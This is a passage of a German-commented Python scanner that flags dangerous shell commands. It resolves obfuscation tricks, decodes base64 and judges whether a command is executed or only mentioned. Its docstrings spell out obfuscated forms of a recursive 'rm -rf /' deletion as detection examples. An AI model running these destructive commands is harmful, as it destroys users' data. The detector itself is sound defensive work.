    puffer, start, dial = [], None, None
    for nr, z, d in quelle:
        if puffer and d != dial:
            yield start, " ".join(puffer), dial
            puffer = []
        if not puffer:
            start, dial = nr, d
        zeichen = _FORTSETZUNG.get(d)
        if zeichen and z.rstrip().endswith(zeichen):
            puffer.append(z.rstrip()[:-1])
            continue
        puffer.append(z)
        yield start, " ".join(puffer), dial
        puffer = []
    if puffer:
        yield start, " ".join(puffer), dial


# --------------------------------------------------------------------------
# Kontext: Wird der Befehl ausgeführt oder nur erwähnt?
# --------------------------------------------------------------------------

# Befehle, deren Zeichenketten-Argumente nur angezeigt oder gesucht werden
ANZEIGE_BEFEHLE = {"echo", "printf", "grep", "egrep", "fgrep", "zgrep", "rg", "ag", "ack",
                   "logger", "notify-send", "whiptail", "dialog", "zenity", "read", "wall",
                   "[", "[[", "test", "man", "apropos", "whatis", "write-host",
                   "write-output", "write-verbose", "write-warning", "write-information",
                   "write-error"}
# Aufrufe, deren Zeichenketten-Argumente nur ausgegeben werden
ANZEIGE_AUFRUF = re.compile(
    r"(?i)(?:print|pprint|printf|println|puts|echo|warn|alert|input|_|gettext|ngettext|"
    r"(?:console|logging|logger|log|_log|_logger|self\.log|self\.logger|self\._log|"
    r"self\._logger|warnings|sys\.stdout|sys\.stderr|click|rich|typer)\.\w+)")
# Befehle, die ihre Eingabe oder ihr Argument ausführen; steht einer davon in
# der Zeile, wird nichts abgestuft
AUSFUEHRER = {"sh", "bash", "zsh", "dash", "ksh", "fish", "csh", "tcsh", "ash", "busybox",
              "source", ".", "eval", "xargs", "sudo", "doas", "su", "runuser", "ssh", "tee",
              "watch", "parallel", "setsid", "script", "systemd-run", "flock", "crontab",
              "at", "batch", "trap", "alias", "awk", "gawk", "mawk", "sed", "socat",
              "docker", "podman", "kubectl", "powershell", "pwsh", "cmd", "iex",
              "invoke-expression", "start-process", "env"}
_INTERPRETER = re.compile(r"(?:python|pypy|perl|ruby|php|node|lua|tclsh)[\d.]*")
_AUSF_RE = re.compile(
    r"(?i)(?:\b(?:os\.system|os\.popen|subprocess\.\w+|popen|execsync|execfile|spawnsync|shell_exec|"
    r"passthru|proc_open)\s*\(|(?<![\w.])(?:exec|eval|system|spawn)\s*\(|"
    r"\b(?:invoke-expression|iex|start-process)\b|(?:^|[|;&(]\s*)(?:sudo|doas|su|exec|env)\b)")
PRAEFIXE = {"sudo", "doas", "env", "nohup", "time", "nice", "ionice", "command", "builtin",
            "stdbuf", "then", "do", "else", "elif", "if", "while", "until", "!", "{", "exec"}
_WORT = re.compile(r"\s*([^\s;|&()<>]+)")
_ZUWEISUNG_WORT = re.compile(r"[A-Za-z_]\w*=.*")
_NAME_VOR_KLAMMER = re.compile(r"([A-Za-z_$][\w.$-]*)\s*$")
_INLINE_CODE = re.compile(r"(`+)(.+?)\1")


@dataclass
class Zitat:
    start: int
    ende: int
    seg: int
    aufruf: str        # Name der innersten offenen Klammer, z. B. print
    ersetzung: bool    # innerhalb von $( ) oder ` `


@dataclass
class Analyse:
    zitate: List[Zitat]
    kommentar: Optional[int]
    ausgewogen: bool
    ausfuehrung: bool
    befehle: List[str]
    code: List[Tuple[int, int]] = field(default_factory=list)


def befehlswort(z: str, pos: int) -> str:
    """Erstes echtes Befehlswort ab pos (überspringt Zuweisungen, sudo, env, Optionen)."""
    for _ in range(8):
        m = _WORT.match(z, pos)
        if not m:
            return ""
        w = m.group(1).strip("\"'`").lower()
        pos = m.end()
        if not w or _ZUWEISUNG_WORT.fullmatch(w) or w in PRAEFIXE or w.startswith("-"):
            continue
        return w.rsplit("/", 1)[-1]
    return ""


def analysiere(z: str, dialekt: str) -> Analyse:
    """Kleine Lexer-Analyse einer Zeile: Zitate, Kommentar, Befehlsabschnitte."""
    if dialekt == "prosa":
        return Analyse([], None, True, False, [],
                       [(m.start(), m.end()) for m in _INLINE_CODE.finditer(z)])
    if dialekt == "doku":
        return Analyse([], None, True, False, [])
    if dialekt == "bat" and re.match(r"\s*(?:rem\b|::)", z, re.I):
        return Analyse([], 0, True, False, [])
    shellartig = dialekt in ("shell", "ps", "bat")
    esc = {"shell": "\\", "python": "\\", "js": "\\", "ps": "`"}.get(dialekt, "")
    esc_in_sq = dialekt in ("python", "js")
    quotes = {"bat": '"', "js": "\"'`"}.get(dialekt, "\"'")
    segs = [(0, False)]
    cur = 0
    stack: list = []           # (art, äußerer Abschnitt, Rückkehr-Quote, Name)
    zitate: List[Zitat] = []
    quote, qstart = None, 0
    kommentar, umleitung = None, False
    i, n = 0, len(z)

    def neu(start, ers):
        segs.append((start, ers))
        return len(segs) - 1

    def aufruf():
        return stack[-1][3] if stack and stack[-1][0] == "(" else ""

    while i < n:
        c = z[i]
        if quote:
            if esc and c == esc and (quote != "'" or esc_in_sq):
                i += 2
                continue
            if c == quote:
                zitate.append(Zitat(qstart, i + 1, cur, aufruf(), segs[cur][1]))
                quote = None
            elif quote == '"' and dialekt in ("shell", "ps") and z.startswith("$(", i):
                zitate.append(Zitat(qstart, i, cur, aufruf(), segs[cur][1]))
                stack.append(("$(", cur, '"', ""))
                cur, quote = neu(i + 2, True), None
                i += 1
            elif quote == '"' and dialekt == "shell" and c == "`":
                zitate.append(Zitat(qstart, i, cur, aufruf(), segs[cur][1]))
                stack.append(("`", cur, '"', ""))
                cur, quote = neu(i + 1, True), None
            i += 1
            continue
        if esc and c == esc:
            i += 2
            continue
        if c in quotes:
            quote, qstart = c, i
        elif c == "#" and ((dialekt in ("shell", "ps") and (i == 0 or z[i - 1] in " \t;&|()"))
                           or dialekt == "python"):
            kommentar = i
            break
        elif dialekt == "js" and z.startswith("//", i):
            kommentar = i
            break
        elif c == "`" and dialekt == "shell":
            if stack and stack[-1][0] == "`":
                _, cur, rq, _ = stack.pop()
                if rq:
                    quote, qstart = rq, i + 1
            else:
                stack.append(("`", cur, None, ""))
                cur = neu(i + 1, True)
        elif dialekt in ("shell", "ps") and z.startswith("$(", i) and not z.startswith("$((", i):
            stack.append(("$(", cur, None, ""))
            cur = neu(i + 2, True)
            i += 1
        elif c == "(":
            m = _NAME_VOR_KLAMMER.search(z, max(0, i - 80), i)
            stack.append(("(", cur, None, m.group(1) if m else ""))
            if shellartig:
                cur = neu(i + 1, segs[cur][1])
        elif c == ")":
            if stack and stack[-1][0] != "`":
                art, aussen, rq, _ = stack.pop()
                if shellartig or art == "$(":
                    cur = aussen
                if rq:
                    quote, qstart = rq, i + 1
        elif shellartig:
            if c in ";&|\n":
                cur = neu(i + 1, segs[cur][1])
            elif c == ">":
                j = i + 1 + (z[i + 1:i + 2] == ">")
                if z[j:j + 1] != "&" and not re.match(r"\s*(?:/dev/null|\$null|nul)\b", z[j:], re.I):
                    umleitung = True
        i += 1
    ausgewogen = quote is None and not any(e[0] in ("$(", "`") for e in stack)
    befehle = [befehlswort(z, s) for s, _ in segs]
    ausfuehrung = (umleitung or bool(_AUSF_RE.search(z))
                   or any(w in AUSFUEHRER or w.startswith("$") or _INTERPRETER.fullmatch(w)
                          for w in befehle))
    return Analyse(zitate, kommentar, ausgewogen, ausfuehrung, befehle)


def einordnen(a: Analyse, pos: int, dialekt: str) -> str:
    """'' = ausgeführt/unklar (volle Stufe), sonst 'erwähnt', 'kommentar', 'fließtext'."""
    if dialekt == "doku":
        return "erwähnt"
    if dialekt == "prosa":
        return "" if any(s <= pos < e for s, e in a.code) else "fließtext"
    if not a.ausgewogen:
        return ""
    if a.kommentar is not None and pos >= a.kommentar:
        return "kommentar"
    if a.ausfuehrung:
        return ""
    for q in a.zitate:
        if q.start <= pos < q.ende:
            if q.ersetzung:
                return ""
            if a.befehle[q.seg] in ANZEIGE_BEFEHLE:
                return "erwähnt"
            if q.aufruf and ANZEIGE_AUFRUF.fullmatch(q.aufruf):
                return "erwähnt"
            return ""
    return ""


# --------------------------------------------------------------------------
# Verschleierung auflösen
# --------------------------------------------------------------------------

_LEERE_QUOTES = re.compile(r"(?<=[\w/-])(?:''|\"\")|(?:''|\"\")(?=[\w/-])")
_QUOTE_IM_WORT = re.compile(r"(?<=\w)(['\"])(\w+)\1|(['\"])(\w+)\3(?=\w)")
_BACKSLASH = re.compile(r"\\(?=[A-Za-z])(?!x[0-9a-fA-F]{2})")
_IFS = re.compile(r"\$\{IFS\}|\$IFS(?:\$\d)?")
_ANSI_C = re.compile(r"\$'((?:[^'\\]|\\.)*)'")
_BEFEHL_ZITIERT = re.compile(r"(^\s*|[;&|(`]\s*|\$\(\s*)([\"'])([\w./-]+)\2(?=\s)")
_ESC = re.compile(r"\\(x[0-9a-fA-F]{1,2}|0?[0-7]{1,3}|[ntrea\\'\"])")


def _esc(s: str) -> str:
    def f(m):
        c = m.group(1)
        if c[0] == "x":
            return chr(int(c[1:], 16))
        if c[0].isdigit():
            return chr(int(c, 8) & 0xFF)
        return {"n": "\n", "t": "\t", "r": "\r", "e": "\x1b", "a": "\a"}.get(c, c)
    return _ESC.sub(f, s)


def entschleiere(zeile: str) -> str:
    """Entfernt einfache Shell-Tricks, die Befehlsnamen zerteilen oder kodieren:
    r''m, r'm', r\\m, rm${IFS}-rf, $'\\x72\\x6d', "rm" -rf.
    Ändert nichts an der gemeldeten Fundstelle."""
    z = _IFS.sub(" ", zeile)
    if "$'" in z:
        z = _ANSI_C.sub(lambda m: _esc(m.group(1)), z)
    z = _LEERE_QUOTES.sub("", z)
    for _ in range(3):
        neu = _QUOTE_IM_WORT.sub(lambda m: m.group(2) or m.group(4), z)
        if neu == z:
            break
        z = neu
    z = _BEFEHL_ZITIERT.sub(lambda m: m.group(1) + m.group(3), z)
    return _BACKSLASH.sub("", z)


_BACKTICK = re.compile(r"`([^`]*)`")
_SUBST_TEXT = re.compile(r"\$\(\s*(echo|printf)\s+([^()$`|;&<>]*?)\s*\)")
_SUBST_B64 = re.compile(
    r"\$\(\s*(?:(?:echo|printf)\s+(?:-n\s+)?([\"']?)([A-Za-z0-9+/]{2,}={0,2})\1\s*\|\s*base64\s+"
    r"(?:-d|--decode|-D)|base64\s+(?:-d|--decode|-D)\s*<<<\s*([\"']?)([A-Za-z0-9+/]{2,}={0,2})\3)\s*\)")
_VARIABLE = re.compile(r"\$\{([A-Za-z_]\w*)\}|\$([A-Za-z_]\w*)")
_ZUWEISUNG = re.compile(
    r"(?:^|(?<=[\s;&|(]))(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)*)?([A-Za-z_]\w*)="
    r"(?:\"([^\"$`\\]*)\"|'([^']*)'|([^\s;&|()'\"`$\\]*))(?=$|[\s;&|)])")
_ZUWEISUNG_PFAD = re.compile(
    r"(?:^|(?<=[\s;&|(]))(?:export\s+|local\s+|readonly\s+|declare\s+(?:-\w+\s+)*)?([A-Za-z_]\w*)="
    r"[\"']?\$\(\s*(?:command\s+-v|which|type\s+-[pP])\s+[\"']?([\w./+-]+)[\"']?\s*\)[\"']?"
    r"(?=$|[\s;&|)])")
_ARGLISTE = re.compile(r"(?:([\"'])[^\"'\n]{0,200}\1\s*,\s*){1,50}([\"'])[^\"'\n]{0,200}\2")
_VERKETTUNG = re.compile(r"([\"'])([^\"'\n]{0,200})\1\s*\+\s*([\"'])([^\"'\n]{0,200})\3")
_ARGLISTE_TEIL = re.compile(r"[\"']([^\"'\n]*)[\"']")


def _b64(text: str) -> Optional[str]:
    try:
        roh = base64.b64decode(text + "=" * (-len(text) % 4), validate=True)
    except (binascii.Error, ValueError):
        return None
    return _lesbar(roh)


def _lesbar(roh: bytes) -> Optional[str]:
    for kodierung in ("utf-8", "utf-16-le"):
        try:
            t = roh.decode(kodierung)
        except UnicodeDecodeError:
            continue
        if (t and sum(32 <= ord(ch) < 127 or ch in "\n\t\r" for ch in t) >= 0.9 * len(t)
                and re.search(r"[A-Za-z]{2}", t)):
            return t
    return None


def _echo_printf(befehl: str, args: str) -> Optional[str]:
    try:
        toks = shlex.split(args)
    except ValueError:
        return None
    if befehl == "echo":
        escapes = False
        while toks and re.fullmatch(r"-[neE]+", toks[0]):
            escapes |= "e" in toks.pop(0)
        s = " ".join(toks)
        return _esc(s) if escapes else s
    if not toks:
        return None
    fmt, rest = _esc(toks[0]), toks[1:]
    return re.sub(r"%[sbd]", lambda m: rest.pop(0) if rest else "", fmt).replace("%%", "%")


def _merke_zuweisungen(t: str, variablen: Dict[str, str]):
    for m in _ZUWEISUNG.finditer(t):
        wert = next(g for g in m.group(2, 3, 4) if g is not None)
        if len(variablen) < 1000 or m.group(1) in variablen:
            variablen[m.group(1)] = wert[:300]
    if "$(" in t:
        # X=$(command -v rm): der Pfad eines Programms gilt als bekannter Wert
        for m in _ZUWEISUNG_PFAD.finditer(t):
            if len(variablen) < 1000 or m.group(1) in variablen:
                variablen[m.group(1)] = os.path.basename(m.group(2))


def aufloesen(z: str, variablen: Dict[str, str], dialekt: str) -> str:
    """Setzt bekannte Variablen, $(echo ...), $(printf ...), $(echo B64 | base64 -d)
    ein und fügt Argumentlisten ('rm', '-rf', '/') und Verkettungen ('r' + 'm') zusammen."""
    t = z
    if dialekt == "shell" and "`" in t:
        t = _BACKTICK.sub(lambda m: "$(" + m.group(1) + ")", t)
    if "$(" in t:
        for _ in range(3):
            neu = _SUBST_B64.sub(lambda m: _b64(m.group(2) or m.group(4)) or m.group(0), t)
            neu = _SUBST_TEXT.sub(lambda m: (_echo_printf(m.group(1), m.group(2)) or m.group(0)), neu)
            if neu == t:
                break
            t = neu
    if dialekt == "shell":
        for _ in range(2):
            if "=" in t:
                _merke_zuweisungen(t, variablen)
            if "$" not in t or not variablen:
                break
            neu = _VARIABLE.sub(lambda m: variablen.get(m.group(1) or m.group(2), m.group(0)), t)
            if neu == t:
                break
            t = neu
    if "," in t:
        t = _ARGLISTE.sub(lambda m: '"' + " ".join(_ARGLISTE_TEIL.findall(m.group(0))) + '"', t)
    if "+" in t:
        for _ in range(5):
            neu = _VERKETTUNG.sub(lambda m: m.group(1) + m.group(2) + m.group(4) + m.group(1), t)
            if neu == t:
                break
            t = neu
    return t


_B64_HINWEIS = re.compile(r"(?i)base64|b64decode|frombase64string|atob\(|\s-(?:enc|encodedcommand|ec)\s")
_B64_TOKEN = re.compile(r"(?<![A-Za-z0-9+/=])[A-Za-z0-9+/]{8,}={0,2}(?![A-Za-z0-9+/=])")


def base64_inhalte(zeile: str) -> List[str]:
    """Dekodiert Base64-Folgen in Zeilen, die erkennbar etwas dekodieren."""
    if not _B64_HINWEIS.search(zeile):
        return []
    aus = []
    for m in _B64_TOKEN.finditer(zeile):
        if len(m.group(0)) % 4 == 1:
            continue
        t = _b64(m.group(0))
        if t:
            aus.append(t[:65536])
            if len(aus) >= 10:
                break
    return aus


def varianten(zeile: str, dialekt: str, variablen: Dict[str, str]):
    """(Text, Herkunft, Dialekt, Detail) - zuerst die Zeile selbst, dann aufgelöste Fassungen."""
    yield zeile, "", dialekt, ""
    klar = entschleiere(zeile)
    if klar != zeile:
        yield klar, "entschleiert", dialekt, klar[:200]
    auf = aufloesen(klar, variablen, dialekt)
    if auf != klar:
        auf = entschleiere(auf)
        if auf not in (zeile, klar):
            yield auf, "aufgelöst", dialekt, auf[:200]
    for inhalt in base64_inhalte(zeile):
        for teil in inhalt.splitlines()[:200]:
            if teil.strip():
                yield teil, "base64", "shell", teil[:200]


# --------------------------------------------------------------------------
# Scannen
# --------------------------------------------------------------------------

KONTEXT_TEXT = {"erwähnt": "nur erwähnt", "kommentar": "im Kommentar", "fließtext": "im Fließtext"}
HERKUNFT_TEXT = {"entschleiert": "verschleiert geschrieben",
                 "aufgelöst": "nach Auflösen von Variablen/Ersetzungen",
                 "base64": "in Base64 versteckt"}


@dataclass
class Treffer:
    zeile: int
    regel: Regel
    text: str
    herkunft: str = ""   # '', 'entschleiert', 'aufgelöst', 'base64'
    kontext: str = ""    # '', 'erwähnt', 'kommentar', 'fließtext'
    detail: str = ""     # aufgelöste Fassung, falls herkunft gesetzt
    variable: Optional[dict] = None  # VAR-CMD: geprüfte und offene Verwendungen

    @property
    def stufe(self) -> int:
        return min(self.regel.stufe, GELB) if self.kontext else self.regel.stufe

    @property
    def entschleiert(self) -> bool:
        return bool(self.herkunft)


@dataclass
class Optionen:
    ohne_kommentare: bool = False
    kontext: bool = True
    ausnahmen: bool = False
    typ: Optional[str] = None
    regeln: Optional[List[Regel]] = None
    zeitlimit: Optional[float] = None  # Sekunden je Datei oder Befehl; None = unbegrenzt


class Zeitlimit(Exception):
    """Das Zeitlimit wurde überschritten. Trägt die bis dahin gefundenen Treffer."""

    def __init__(self, treffer: List["Treffer"], erlaubt: List["Treffer"], zeile: int):
        super().__init__(f"Zeitlimit überschritten in Zeile {zeile}")
        self.treffer, self.erlaubt, self.zeile = treffer, erlaubt, zeile


@dataclass
class Ergebnis:
    pfad: str
    treffer: List[Treffer] = field(default_factory=list)
    fehler: Optional[str] = None
    bekannt: int = 0  # über --basis ausgeblendete Treffer
    erlaubt: List[Treffer] = field(default_factory=list)  # über Kommentar erlaubt
    typ: str = ""
    abgebrochen: bool = False  # Zeitlimit: Rest der Datei nicht geprüft
    hinweis: List[Treffer] = field(default_factory=list)  # ohne Einfluss auf die Ampel

    @property
    def ampel(self) -> int:
        return max((t.stufe for t in self.treffer), default=GRUEN)

    def anzahl(self, stufe: int) -> int:
        return sum(1 for t in self.treffer if t.stufe == stufe)


_AUSNAHME = re.compile(r"(?:#|//|--|<!--|\bREM\b|::)\s*gefahrencheck:\s*erlaubt\s+"
                       r"([A-Z0-9][A-Z0-9-]*(?:\s*,\s*[A-Z0-9][A-Z0-9-]*)*)", re.I)
_NUR_AUSNAHME = re.compile(r"\s*(?:#|//|--|<!--|REM\b|::)\s*gefahrencheck:", re.I)


_INDEX_CACHE: Dict[Tuple[int, ...], tuple] = {}


def _wortindex(regeln: List[Regel]):
    """(alle Schlüsselwörter, Wort -> Regelnummern, Regeln ohne Wörter) - einmal je Regelsatz."""
    kennung = tuple(id(r) for r in regeln)
    if kennung not in _INDEX_CACHE:
        nach_wort: Dict[str, set] = {}
        immer = set()
        for i, r in enumerate(regeln):
            if not r.worte:
                immer.add(i)
            for w in r.worte:
                nach_wort.setdefault(w, set()).add(i)
        _INDEX_CACHE[kennung] = (tuple(nach_wort), nach_wort, frozenset(immer))
    return _INDEX_CACHE[kennung]


def _kandidaten(regeln: List[Regel], index: tuple, klein: str) -> List[Regel]:
    """Regeln, deren Schlüsselwort in der Zeile vorkommt (Reihenfolge bleibt erhalten)."""
    if not VORFILTER:
        return regeln
    worte, nach_wort, immer = index
    nummern = set(immer)
    for w in worte:
        if w in klein:
            nummern |= nach_wort[w]
    return [regeln[i] for i in sorted(nummern)]


def scanne(text: str, opt: Optional[Optionen] = None) -> Tuple[List[Treffer], List[Treffer]]:
    """Liefert (Treffer, über Kommentar erlaubte Treffer).
    Mit opt.zeitlimit: wirft Zeitlimit mit den bis dahin gefundenen Treffern."""
    opt = opt or Optionen()
    regeln = opt.regeln if opt.regeln is not None else REGELN
    treffer: List[Treffer] = []
    erlaubt: List[Treffer] = []
    variablen: Dict[str, str] = {}
    vorgemerkt: set = set()
    index = _wortindex(regeln)
    frist = time.monotonic() + opt.zeitlimit if opt.zeitlimit else None

    def uebernehmen(beste: Dict[str, Treffer], frei: set):
        for t in sorted(beste.values(), key=lambda t: -t.stufe):
            (erlaubt if t.regel.id in frei else treffer).append(t)

    for nr, zeile, dialekt in zeilen(text, opt.typ):
        if frist is not None and time.monotonic() > frist:
            raise Zeitlimit(treffer, erlaubt, nr)
        s = zeile.strip()
        if not s:
            continue
        frei, vorgemerkt = vorgemerkt, set()
        if opt.ausnahmen and "gefahrencheck" in zeile:
            m = _AUSNAHME.search(zeile)
            if m:
                ids = {x.strip().upper() for x in m.group(1).split(",")}
                if _NUR_AUSNAHME.match(zeile):
                    vorgemerkt = ids
                    continue
                frei = frei | ids
        if (opt.ohne_kommentare and dialekt != "prosa" and s.startswith("#")
                and not s.startswith("#!")):
            continue
        beste: Dict[str, Treffer] = {}
        if len(zeile) > MAX_ZEILE:
            if REGEL_LANG in regeln:
                beste["lang"] = Treffer(nr, REGEL_LANG, s[:200])
            zeile = zeile[:MAX_ZEILE]
        for variante, herkunft, dial, detail in varianten(zeile, dialekt, variablen):
            analyse = None
            for regel in _kandidaten(regeln, index, variante.lower()):
                if frist is not None and time.monotonic() > frist:
                    uebernehmen(beste, frei)
                    raise Zeitlimit(treffer, erlaubt, nr)
                kandidat = None
                for m in stellen(regel, variante):
                    kx = ""
                    if opt.kontext and herkunft != "base64":
                        if analyse is None:
                            analyse = analysiere(variante, dial)
                        kx = einordnen(analyse, m.start(), dial)
                    if kx == "kommentar" and opt.ohne_kommentare:
                        continue
                    t = Treffer(nr, regel, s[:500], herkunft, kx, detail)
                    if kandidat is None or t.stufe > kandidat.stufe:
                        kandidat = t
                    if not kx:
                        break  # ausgeführter Treffer gefunden, weitere Stellen egal
                if kandidat is None:
                    continue
                alt = beste.get(regel.gruppe)
                if alt is None or kandidat.stufe > alt.stufe:
                    beste[regel.gruppe] = kandidat
        uebernehmen(beste, frei)
    return treffer, erlaubt


# --------------------------------------------------------------------------
# Variablen mit Befehlen (VAR-CMD): Verwendungen verfolgen
# --------------------------------------------------------------------------
#
# VAR-CMD meldet X=rm, weil ein Aufruf über $X die Mustersuche umgehen kann. Steht
# jede Verwendung von $X nach einer festen Zuweisung, hat scanne() sie aber schon
# aufgelöst geprüft. Dann bleibt nur ein HINWEIS. Herabgestuft wird nur ohne Zweifel:
# Jeder der folgenden Gründe lässt VAR-CMD auf GELB und wird in der Meldung genannt.

MAX_VARIABLEN = 50  # je Datei höchstens so viele VAR-CMD-Variablen verfolgen
_SOURCE = re.compile(r"(?:^|[;&|]\s*|\b(?:then|do|else)\s+)(?:source|\.)\s+[^\s;&|=]")
_INDIREKT = re.compile(r"\$\{!|\b(?:declare|local|typeset)\s+-\w*n")
_EVAL = re.compile(r"\beval\b")


def _zuweisungen(name: str):
    n = re.escape(name)
    return (re.compile(r"(?:^|(?<=[\s;&|(]))((?:export\s+|local\s+|readonly\s+|"
                       r"(?:declare|typeset)\s+(?:-\w+\s+)*)?)" + n + r"(\+?)="),
            re.compile(r"\b(?:read|mapfile|readarray)\b[^;&|]*\s" + n + r"\b|\bfor\s+" + n +
                       r"\s+in\b|\bprintf\s+-v\s+" + n + r"\b|\b(?:let|getopts)\b[^;&|]*\b" + n + r"\b"),
            re.compile(r"\b(?:export|declare\s+-\w*x\w*)\s+(?:[A-Za-z_]\w*(?:=\S*)?\s+)*" + n + r"\b"),
            re.compile(r"\$(?:\{(!?)" + n + r"([^}]*)\}|" + n + r"(?!\w))"))


def _fester_wert(z: str, pos: int, name: str) -> Optional[str]:
    """Wert der Zuweisung ab pos, wenn scanne() ihn kennt (fest), sonst None."""
    for rx in (_ZUWEISUNG, _ZUWEISUNG_PFAD):
        m = rx.match(z, pos)
        if m and m.group(1) == name:
            if rx is _ZUWEISUNG_PFAD:
                return os.path.basename(m.group(2))
            wert = next(g for g in m.group(2, 3, 4) if g is not None)
            return wert if len(wert) <= 300 else None
    return None


def verfolge_variable(name: str, zeile_nr: int, spalte: int,
                      shell: List[Tuple[int, str]]) -> dict:
    """Sucht alle Verwendungen von $name. Liefert {'geprueft': [Zeilen],
    'offen': [{'zeile', 'grund'}]}; zeile_nr/spalte: Ort der gemeldeten Zuweisung."""
    zuw, dynamisch, export, verw = _zuweisungen(name)
    geprueft, offen, werte = [], [], {}
    erste = (zeile_nr, spalte)

    def merke(zeile, grund):
        if len(offen) < 50:
            offen.append({"zeile": zeile, "grund": grund})

    for nr, z in shell:
        if name not in z:
            continue
        for m in zuw.finditer(z):
            pos = m.start(1)
            if (nr, pos) < erste:
                erste = (nr, pos)
            if m.group(2):
                merke(nr, "Wert wird ergänzt (+=)")
                continue
            wert = _fester_wert(z, m.start(1) + len(m.group(1)), name)
            if wert is None:
                merke(nr, "neue Zuweisung mit unbekanntem Wert")
            else:
                werte.setdefault(wert, nr)
            if "export" in m.group(1) or re.search(r"-\w*x", m.group(1)):
                merke(nr, "exportiert - andere Programme sehen die Variable")
        if dynamisch.search(z):
            merke(nr, "Wert wird zur Laufzeit gesetzt (read, for, printf -v ...)")
        if export.search(z) and not zuw.search(z):
            merke(nr, "exportiert - andere Programme sehen die Variable")
    if len(werte) > 1:
        zweite = sorted(werte.values())[1]
        merke(zweite, "mehrfach mit verschiedenen Werten belegt")
    for nr, z in shell:
        if "$" not in z or name not in z:
            continue
        for m in verw.finditer(z):
            if m.group(1):
                merke(nr, "indirekte Expansion ${!...}")
            elif m.group(2):
                merke(nr, "Ersetzungsregel ${...} wird nicht aufgelöst")
            elif (nr, m.start()) < erste:
                merke(nr, "Verwendung vor der Zuweisung")
            elif _EVAL.search(z):
                merke(nr, "Verwendung in eval")
            elif nr not in geprueft:
                geprueft.append(nr)
    if not geprueft and not offen:
        merke(None, "in dieser Datei nicht verwendet - Verwendung anderswo nicht prüfbar")
    return {"geprueft": geprueft, "offen": offen}


def bewerte_variablen(text: str, typ: Optional[str],
                      treffer: List[Treffer]) -> Tuple[List[Treffer], List[Treffer]]:
    """Stuft VAR-CMD-Treffer zum HINWEIS herab, wenn alle Verwendungen geprüft sind.
    Liefert (Treffer, Hinweise)."""
    kandidaten = [t for t in treffer if t.regel.id == "VAR-CMD" and not t.herkunft
                  and not t.kontext]
    if not kandidaten:
        return treffer, []
    alle = list(zeilen(text, typ))
    shell = [(nr, z.strip()) for nr, z, d in alle if d == "shell"]
    nach_nr = {nr: z for nr, z in shell}
    global_offen = []
    if any(_SOURCE.search(z) for _, z in shell):
        global_offen.append("Datei bindet andere Skripte ein (source) - dort nicht prüfbar")
    if any(_INDIREKT.search(z) for _, z in shell):
        global_offen.append("Datei nutzt indirekte Variablen (${!...}, declare -n)")
    hinweis, neu, gezaehlt = [], [], 0
    for t in treffer:
        if t not in kandidaten:
            neu.append(t)
            continue
        z = nach_nr.get(t.zeile)
        namen = [(m.group(0).split("=", 1)[0], m.start()) for m in t.regel.regex.finditer(z)] if z else []
        if not namen or gezaehlt + len(namen) > MAX_VARIABLEN:
            neu.append(t)
            continue
        gezaehlt += len(namen)
        info = {"namen": [n for n, _ in namen], "geprueft": [], "offen": []}
        for name, spalte in namen:
            v = verfolge_variable(name, t.zeile, spalte, shell)
            info["geprueft"] += [nr for nr in v["geprueft"] if nr not in info["geprueft"]]
            info["offen"] += [dict(o, name=name) for o in v["offen"]]
        info["offen"] += [{"zeile": None, "grund": g, "name": None} for g in global_offen]
        info["geprueft"].sort()
        t.variable = info
        (neu if info["offen"] else hinweis).append(t)
    return neu, hinweis


def pruefe_text(name: str, text: str, opt: Optionen) -> Ergebnis:
    """Scannt einen Text und hält eine Zeitüberschreitung im Ergebnis fest."""
    try:
        tr, er = scanne(text, opt)
    except Zeitlimit as z:
        return Ergebnis(name, z.treffer, erlaubt=z.erlaubt, typ=opt.typ or "",
                        fehler=f"Zeitlimit von {opt.zeitlimit:g} s überschritten in Zeile {z.zeile}, "
                               "Rest nicht geprüft", abgebrochen=True)
    tr, hw = bewerte_variablen(text, opt.typ, tr)
    return Ergebnis(name, tr, erlaubt=er, typ=opt.typ or "", hinweis=hw)


def scanne_text(text: str, ohne_kommentare: bool = False, typ: Optional[str] = None,
                kontext: bool = True) -> List[Treffer]:
    return scanne(text, Optionen(ohne_kommentare, kontext, False, typ))[0]


def ist_binaer(daten: bytes) -> bool:
    return b"\x00" in daten[:8192]


def scanne_datei(pfad: str, max_bytes: int, opt: Optionen) -> Optional[Ergebnis]:
    try:
        if os.path.getsize(pfad) > max_bytes:
            return Ergebnis(pfad, fehler="übersprungen (zu groß)")
        with open(pfad, "rb") as f:
            daten = f.read()
    except OSError as e:
        return Ergebnis(pfad, fehler=f"nicht lesbar: {e.strerror}")
    if ist_binaer(daten):
        return None  # Binärdateien still überspringen
    text = daten.decode("utf-8", errors="replace")
    typ = opt.typ or dateityp(pfad, text)
    o = Optionen(opt.ohne_kommentare, opt.kontext, opt.ausnahmen, typ, opt.regeln, opt.zeitlimit)
    return pruefe_text(pfad, text, o)


def sammle_dateien(pfade: List[str], ausschluss: List[str]):
    for p in pfade:
        if os.path.isfile(p):
            yield p
        elif os.path.isdir(p):
            for wurzel, ordner, dateien in os.walk(p, followlinks=False):
                ordner[:] = sorted(o for o in ordner
                                   if not any(fnmatch.fnmatch(o, a) for a in ausschluss))
                for d in sorted(dateien):
                    if any(fnmatch.fnmatch(d, a) for a in ausschluss):
                        continue
                    voll = os.path.join(wurzel, d)
                    if os.path.isfile(voll) and not os.path.islink(voll):
                        yield voll
        else:
            yield ("FEHLT", p)


# --------------------------------------------------------------------------
# Regeldatei
# --------------------------------------------------------------------------

def lade_regeldatei(pfad: str, regeln: List[Regel]) -> List[Regel]:
    """JSON-Datei mit {"regeln": [...], "abschalten": [...]} anwenden.
    Jede Regel braucht Beispiele; sie werden beim Laden geprüft."""
    with open(pfad, encoding="utf-8") as fh:
        daten = json.load(fh)
    if not isinstance(daten, dict):
        raise ValueError("oberste Ebene muss ein Objekt sein")
    neu = {r.id: r for r in regeln}
    for rid in daten.get("abschalten", []):
        if rid not in neu:
            raise ValueError(f"abschalten: unbekannte Regel {rid}")
        del neu[rid]
    for nr, e in enumerate(daten.get("regeln", []), 1):
        rid = str(e.get("id", f"#{nr}"))
        try:
            if not re.fullmatch(r"[A-Z0-9][A-Z0-9-]*", rid):
                raise ValueError("Kennung nur aus A-Z, 0-9 und Bindestrich")
            stufe = {"ROT": ROT, "GELB": GELB}.get(str(e["stufe"]).upper())
            if stufe is None:
                raise ValueError("stufe muss ROT oder GELB sein")
            danach = e.get("danach")
            if danach is not None and not (isinstance(danach, dict) and danach and all(
                    isinstance(k, str) and isinstance(v, str) for k, v in danach.items())):
